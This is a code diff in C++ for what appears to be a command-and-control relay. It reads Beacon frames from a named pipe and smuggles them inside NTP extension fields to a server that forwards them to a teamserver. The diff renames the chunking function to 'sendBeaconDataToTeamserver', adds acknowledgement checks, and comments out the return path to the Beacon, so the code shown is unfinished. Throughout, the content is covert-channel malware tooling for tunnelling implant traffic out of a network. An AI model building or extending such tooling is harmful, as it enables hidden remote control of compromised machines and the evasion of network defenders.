@@ -23,7 +23,16 @@ std::vector<uint8_t> size_tToBytes(size_t value) {
 	return bytes;
 }
 
-std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2> extensionField, std::vector<uint8_t> clientId) {
+/*
+Chunker function to send data TO the Server, which will store it, and forward it on to the teamserver.
+
+There's also a function to GET data from the teamserver, which will GET the stored data from the TS and bring it back, it works very similarly, but
+sends a blank get data packet up, then the data comes back through the response. 
+
+Not the most efficent way to do this, but one of the simplist/clearest.
+
+*/
+std::vector<uint8_t> sendBeaconDataToTeamserver(std::vector<uint8_t> data, std::array < uint8_t, 2> extensionField, std::vector<uint8_t> clientId) {
 	std::cout << "======================" << std::endl;
 	std::cout << "Started Chunking		" << std::endl;
 	std::cout << "======================" << std::endl;
@@ -53,6 +62,8 @@ std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2>
 	std::vector < uint8_t> packetToNotifyServerOfSizeBytes = packetToNotifyServerOfSize.getPacket();
 	std::vector<uint8_t> response = sendChunk(packetToNotifyServerOfSizeBytes);
 	
+	//server should now know that the size is size of data to be sent
+	//now we start sending the actual data, with the dataForTeamserver
 	// Loop over each chunk index
 	for (int i = 0; i < amountOfChunks; ++i) { //++i as we want to get the last chunk
 		size_t start = i * Chunk::maxChunkSize; //get how far into the data we need to be to get the chunk
@@ -86,16 +97,19 @@ std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2>
 		std::cout << "----------------------" << std::endl;
 		std::cout << "Recieved Response Packet" << std::endl;
 		std::cout << "----------------------" << std::endl;
-		//run the debugger directly on the incoming respnose packet
-		packetDebugger(response);
+		////run the debugger directly on the incoming respnose packet
+		//packetDebugger(response);
 
-		//Parse NTP packet, get data out of it (or whatever else is needed)
+		////Parse NTP packet, get data out of it (or whatever else is needed)
 		NTPPacketParser responsePacketParser = NTPPacketParser(response);
-		//Get extension data:
-		std::vector<uint8_t> extensionData = responsePacketParser.getExtensionData();
-
-		//take extracted extension data, put into buffer
-		responseDataBuffer.insert(responseDataBuffer.end(), extensionData.begin(), extensionData.end()); // append response to responseBuffer
+		//Make sure server says OK when it gets data
+		if (responsePacketParser.getExtensionField() == NtpExtensionField::sizePacketAcknowledge) {
+			std::cout << "[?] Got successful ACK from server.";
+		}
+		else {
+			std::cout << "[!] Did not get successful ACK from server.";
+		}
+		//Done! 
 
 	}
 	//print full response data
@@ -247,6 +261,7 @@ void pipeStuff(std::vector<uint8_t> clientId) {
 	 */
 	while (TRUE) {
 		/* read from our named pipe Beacon */
+		std::cout << "[?] Attempting to read frame from Pipe";
 		DWORD read = read_frame(handle_beacon, buffer, BUFFER_MAX_SIZE);
 		if (read < 0) {
 			std::cerr << "Error reading from pipe" << std::endl;
@@ -257,21 +272,24 @@ void pipeStuff(std::vector<uint8_t> clientId) {
 		std::vector<uint8_t> vec(buffer, buffer + read);
 
 		//send with chunker
-		std::vector<uint8_t> dataFromTeamserver = chunker(
+		sendBeaconDataToTeamserver(
 			vec,
 			NtpExtensionField::dataForTeamserver,
 			clientId
 		);
+		std::cout << "[?] Data sent to teamserver, now reciving data back";
+
+		//then need to getBeaconDataFromTeamserver (which will ask the server for the data for this client)
 
 		//extract data out from chunker response
-		NTPPacketParser dataFromTeamserverClass(dataFromTeamserver);
-		auto dataForBeaconVec = dataFromTeamserverClass.getExtensionData();
+		//NTPPacketParser dataFromTeamserverClass(dataFromTeamserver);
+		//auto dataForBeaconVec = dataFromTeamserverClass.getExtensionData();
 
 		//convert to const char * as that's what write_frame wants
-		auto dataForBeacon = reinterpret_cast<char*>(dataForBeaconVec.data());
+		//auto dataForBeacon = reinterpret_cast<char*>(dataForBeaconVec.data());
 
 		/* write to our named pipe Beacon */
-		write_frame(handle_beacon, dataForBeacon, read);
+		//write_frame(handle_beacon, dataForBeacon, read);
 	}
 }
 
